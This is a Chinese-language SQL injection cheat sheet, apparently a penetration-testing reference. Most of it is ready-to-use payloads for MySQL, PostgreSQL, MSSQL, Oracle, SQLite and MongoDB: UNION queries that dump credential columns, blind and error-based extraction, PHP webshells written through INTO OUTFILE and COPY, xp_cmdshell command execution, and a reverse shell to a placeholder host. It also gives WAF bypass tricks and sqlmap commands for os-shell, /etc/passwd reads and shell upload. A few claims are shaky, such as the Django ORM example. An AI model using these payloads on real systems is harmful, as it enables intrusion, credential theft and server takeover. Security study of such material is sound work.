# SQL 注入 (SQL Injection)

## 原理

应用程序将用户输入直接拼接到 SQL 查询字符串中，未做参数化处理，导致攻击者可以改变 SQL 语义，执行任意数据库操作（读取敏感数据、写文件、命令执行）。

经典示例：
```php
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = $id";
// 输入 id=1 UNION SELECT 1,2,3 -- 即可注入
```

## 分类

| 类型 | 特征 | 利用难度 |
|------|------|---------|
| 回显注入 | 页面直接显示查询结果 | 低 |
| 报错注入 | 页面显示 SQL 错误信息 | 低 |
| 盲注（布尔） | 页面有 True/False 两种状态 | 中 |
| 盲注（时间） | 只能通过响应时间判断 | 高 |
| 二次注入 | 数据先存入数据库，再次查询时触发 | 中 |
| 堆叠注入 | 支持多语句执行（`;`） | 视数据库而定 |
| NoSQL 注入 | MongoDB/CouchDB 等 | 视语法而定 |

## 攻击链

### 1. 判断注入点

```sql
-- 数字型
?id=1 AND 1=1   -- 正常
?id=1 AND 1=2   -- 异常

-- 字符型
?id=1' AND '1'='1   -- 正常
?id=1' AND '1'='2   -- 异常

-- 万能密码（登录场景）
username=admin' OR '1'='1'-- -
password=anything
```

### 2. 判断列数

```sql
?id=1 ORDER BY 1-- -
?id=1 ORDER BY 2-- -
-- 递增直到报错，报错前一个数就是列数

-- 或用 UNION
?id=1 UNION SELECT 1-- -
?id=1 UNION SELECT 1,2-- -
?id=1 UNION SELECT 1,2,3-- -
```

### 3. 找回显位

```sql
?id=-1 UNION SELECT 1,2,3-- -
-- 看页面哪些位置显示了 1/2/3
```

### 4. 获取数据库信息

```sql
-- MySQL
UNION SELECT 1,version(),database()-- -
UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata-- -
UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users-- -

-- PostgreSQL
UNION SELECT 1,current_database(),version()-- -
UNION SELECT 1,string_agg(tablename,','),3 FROM pg_tables WHERE schemaname='public'-- -

-- MSSQL
UNION SELECT 1,DB_NAME(),@@version-- -
UNION SELECT 1,name,3 FROM sys.tables-- -

-- Oracle
UNION SELECT NULL,banner,NULL FROM v$version-- -
UNION SELECT NULL,table_name,NULL FROM all_tables-- -

-- SQLite
UNION SELECT 1,sqlite_version(),3-- -
UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table'-- -
```

### 5. 报错注入（页面有 SQL 错误时）

```sql
-- MySQL extractvalue
?id=1 AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))

-- MySQL updatexml
?id=1 AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)

-- MySQL floor
?id=1 AND (SELECT 1 FROM (SELECT count(*),concat((SELECT version()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)

-- PostgreSQL
?id=1 AND 1=CAST((SELECT version()) AS INT)

-- MSSQL
?id=1 AND 1=CONVERT(int,(SELECT @@version))
```

### 6. 盲注（布尔）

```sql
-- 判断数据库版本长度
?id=1 AND length(version())=6-- -

-- 逐字符判断
?id=1 AND ascii(substr(version(),1,1))=53-- -   -- '5'
?id=1 AND ascii(substr(version(),2,1))=46-- -   -- '.'

-- 二分法加速
?id=1 AND ascii(substr(version(),1,1))>50-- -
?id=1 AND ascii(substr(version(),1,1))>60-- -
```

### 7. 盲注（时间）

```sql
-- MySQL
?id=1 AND IF(length(version())=6,SLEEP(3),0)-- -
?id=1 AND IF(ascii(substr(version(),1,1))=53,SLEEP(3),0)-- -

-- PostgreSQL
?id=1 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE 0 END)-- -

-- MSSQL
?id=1; IF (SELECT LEN(@@version))=23 WAITFOR DELAY '0:0:3'-- -

-- Oracle
?id=1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',3)=1-- -
```

### 8. 写文件 / 命令执行

```sql
-- MySQL 写 Webshell（需要 secure_file_priv 为空或可写目录）
UNION SELECT 1,'<?php @eval($_POST[cmd]);?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -
UNION SELECT 1,'<?php @eval($_POST[cmd]);?>',3 INTO DUMPFILE '/var/www/html/shell.php'-- -

-- MySQL UDF 提权（Windows）
-- 上传 dll 到 plugin 目录，创建函数调用

-- MSSQL xp_cmdshell
?id=1; EXEC sp_configure 'show advanced options',1; RECONFIGURE;-- -
?id=1; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
?id=1; EXEC xp_cmdshell 'whoami';-- -

-- PostgreSQL COPY
?id=1; COPY (SELECT '<?php @eval($_POST[cmd]);?>') TO '/var/www/html/shell.php';-- -
?id=1; COPY (SELECT $$cmd$$) TO PROGRAM 'bash -c "id;bash -i >& /dev/tcp/ATTACKER/4444 0>&1"';-- -
```

## 绕过技巧

### 关键字过滤

```sql
-- 大小写混合
UnIoN SeLeCt

-- 注释绕过
UN/**/ION SEL/**/ECT
UN%0aION SEL%0aECT

-- 双写绕过（过滤一次）
UNUNIONION SELSELECTECT

-- 编码绕过
CHAR(117,110,105,111,110)  -- 'union' 的 CHAR 编码
0x756e696f6e                -- 'union' 的 hex

-- 内联注释（MySQL 特有）
/*!50000UNION*/ /*!50000SELECT*/

-- 等价函数
substr()  → substring(), mid(), left(), right()
ascii()   → ord(), hex(), bin()
sleep()   → benchmark(10000000,sha1('a')), get_lock('a',3)
concat()  → concat_ws(), group_concat(), make_set()
```

### 空格过滤

```sql
-- 注释替代空格
UNION/**/SELECT/**/1,2,3

-- 括号绕过
UNION(SELECT(1),(2),(3))

-- 特殊字符
%09 (Tab), %0a (LF), %0b (VT), %0c (FF), %0d (CR), %a0 (NBSP)
UNION%0aSELECT%0a1,2,3

-- 反引号（MySQL）
SELECT`username`FROM`users`
```

### 引号过滤

```sql
-- 十六进制
WHERE username=0x61646d696e   -- 'admin'

-- char 函数
WHERE username=CHAR(97,100,109,105,110)

-- 宽字节注入（GBK 编码）
?id=1%df'   -- %df%27 → 运河'  吃掉反斜杠
```

### 逗号过滤

```sql
-- UNION 用 JOIN 替代
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c

-- substr 用 FROM FOR
substr(version() FROM 1 FOR 1)

-- limit 用 OFFSET
LIMIT 1 OFFSET 0
```

### 等号过滤

```sql
-- LIKE / RLIKE / IN
WHERE id LIKE 1
WHERE id RLIKE 1
WHERE id IN (1)

-- BETWEEN
WHERE id BETWEEN 1 AND 1

-- <> / !=
WHERE id <> 0
```

### WAF 绕过（高级）

```sql
-- 分块传输
POST / HTTP/1.1
Transfer-Encoding: chunked

3
id=
1
1
0


-- 参数污染（HPP）
?id=1&id=UNION SELECT 1,2,3

-- 内联注释 + 换行
/*!12345UNION*//*!12345SELECT*//*!123451,2,3*/

-- 大量垃圾数据填充（绕过长度限制检测）
id=1 AND (SELECT * FROM (SELECT(SLEEP(0)))a) AND 1=1&padding=AAAA...(10000个A)
```

## NoSQL 注入

### MongoDB

```javascript
// 原本
db.users.find({username: req.body.user, password: req.body.pass})

// 注入（提交 JSON）
{"user":"admin","pass":{"$ne":"wrongpass"}}
{"user":{"$regex":"^a"},"pass":{"$ne":"wrongpass"}}
{"user":{"$gt":""},"pass":{"$gt":""}}   // 返回所有用户

// $where 注入
{"$where":"this.username == 'admin' && this.password.charAt(0) == 'a'"}

// 盲注
{"$where":"if(this.password.charAt(0)=='a'){sleep(3000);return true}else{return false}"}
```

### Redis / Memcached

```python
# 原本
query = "GET " + key

# 注入（CRLF）
key = "foo\r\nSET admin 1\r\nGET foo"
```

## sqlmap 自动化

```bash
# 基础
sqlmap -u "http://target.com/?id=1" --batch --random-agent

# POST
sqlmap -u "http://target.com/login" --data="user=admin&pass=123" --batch

# 指定参数
sqlmap -u "URL" -p id --batch

# Cookie 注入
sqlmap -u "URL" --cookie="PHPSESSID=xxx" --level=2

# HTTP 头注入
sqlmap -u "URL" --headers="X-Forwarded-For: 1*" --level=5

# 跑库
sqlmap -u "URL" --dbs
sqlmap -u "URL" -D dbname --tables
sqlmap -u "URL" -D dbname -T tablename --dump

# OS Shell
sqlmap -u "URL" --os-shell
sqlmap -u "URL" --os-cmd="whoami"

# 文件操作
sqlmap -u "URL" --file-read="/etc/passwd"
sqlmap -u "URL" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Tamper 脚本绕过 WAF
sqlmap -u "URL" --tamper="tamper/between.py,tamper/randomcase.py,tamper/space2comment.py"

# 二阶注入
sqlmap -u "URL" --second-url="http://target.com/profile.php"

--level=5 --risk=3   # 最强测试
```

## 常用 Tamper 脚本

| Tamper | 用途 |
|--------|------|
| `space2comment.py` | 空格转 `/**/` |
| `between.py` | `>` 转 `BETWEEN` |
| `randomcase.py` | 关键字随机大小写 |
| `charencode.py` | URL 编码 |
| `charunicodeencode.py` | Unicode 编码 |
| `apostrophemask.py` | `'` 转 `%EF%BC%87` |
| `halfversionedmorekeywords.py` | 关键字加 `/*!0` |
| `modsecurityversioned.py` | 绕过 ModSecurity |
| `space2plus.py` | 空格转 `+` |
| `unionallifnull.py` | `UNION ALL` 转 `UNION` |

## 2024-2026 新技术点

### 1. MySQL 8.x 新特性

```sql
-- WINDOW 函数绕过
UNION SELECT row_number() OVER (),1,2

-- JSON 函数
UNION SELECT JSON_EXTRACT('{"a":1}','$.a'),2,3

-- LATERAL 派生表
SELECT * FROM users u, LATERAL (SELECT 1) x
```

### 2. PostgreSQL 14+ 新特性

```sql
-- JSONB 路径查询
SELECT * FROM jsonb_path_query('[1,2,3]','$[*]')

-- multirange 类型
SELECT * FROM users WHERE id <@ int4multirange'[1,100]'
```

### 3. SQL Server 2022 新特性

```sql
-- IS [NOT] DISTINCT FROM
SELECT * FROM users WHERE id IS NOT DISTINCT FROM 1

-- GREATEST/LEAST
SELECT GREATEST(1,2,3)
```

### 4. 现代框架 ORM 注入

```python
# Django ORM 注入
Model.objects.filter(name=request.GET['name'])
# 输入 name=] OR 1=1 -- 可绕过某些场景

# SQLAlchemy
session.query(User).filter(text(f"name = '{name}'"))

# Prisma (Node.js)
prisma.user.findMany({where: {name: req.query.name}})
# 输入 name={startsWith: ''} 可枚举所有用户
```

### 5. GraphQL SQL 注入

```graphql
query {
  user(name: "' UNION SELECT 1,2,3-- ") {
    id
    name
  }
}
```

### 6. JSON SQL 注入（MySQL JSON 列）

```sql
-- JSON 列查询
SELECT * FROM users WHERE JSON_EXTRACT(meta, '$.role') = 'admin'

-- 注入
$.role' = 'admin' OR '1'='1
```

### 7. AI 辅助注入点发现

- 使用 LLM 分析 SQL 错误信息，自动推断数据库类型和版本
- 自动生成针对特定 WAF 的 tamper 脚本

### 8. 云数据库特殊场景

- AWS RDS / Aurora：`secure_file_priv` 通常为 NULL，无法写文件，但可读元数据
- Cloud SQL：默认禁用 `xp_cmdshell`，需通过 UDF
- MongoDB Atlas：`$where` 默认禁用，但 `$expr` 仍可利用

## 工具推荐

- **sqlmap** — 自动化注入神器
- **NoSQLMap** — NoSQL 注入
- **BBQSQL** — 盲注框架
- **ghauri** — sqlmap 替代品，对某些 WAF 效果更好
- **NoSQLi** — NoSQL 注入工具

## 参考链接

- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [sqlmap wiki](https://github.com/sqlmapproject/sqlmap/wiki)
